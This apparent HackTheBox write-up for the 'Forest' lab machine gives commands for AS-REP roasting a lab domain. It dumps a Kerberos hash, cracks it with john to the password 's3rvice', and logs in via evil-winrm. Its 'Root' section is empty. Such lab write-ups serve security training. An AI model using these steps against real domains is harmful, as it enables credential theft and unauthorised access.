# Forest
## User 

after an enum4linux we can get a bunch of users list them into a file usernames.txt set the /etc/hosts file properly then:
```bash
python GetNPUsers.py htb.local/ -usersfile ../../../HackTheBox/forest/usernames.txt -format john 
```
we get:
```
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$svc-alfresco@HTB.LOCAL:694611eec7e3b79f661f40e92ab84f13$a2815a08334f182d3386b4745213238fbff0acfe73d3d6da0c8d46b8fa1e93e8af095c25da726e76f5cb30d879133dd605456cf8583020d18917a933299f33704e77a805c71b053474b635c0e52a22cda3fae86b3e794e057add4ad051c1fb6d7416dc36b225c017ee12e0e786c71cf72cd613bd1ce8281108d4b1855b1d0007590dfd339dc62de725eacb350b1a42fc895c3c55d08dfa6545540a6c12742c5a5e7dc9fb962c68f63d4b8a639045dbf53f75f14b853be12fc00ad2d7c82527ac8a3fbcd1e9c8036f74840f8c85e2e1de7fc1d60ca06591b681ec50d3477657ca8f61d945f84d
```
after john:
```bash
john hash_john --wordlist=/home/floki/wordlists/rockyou.txt
```
we get : $krb5asrep$svc-alfresco@HTB.LOCAL:s3rvice

so we can connect with:
```bash
ruby evil-winrm.rb -i 10.10.10.161 -u svc-alfresco -p s3rvice
```

## Root
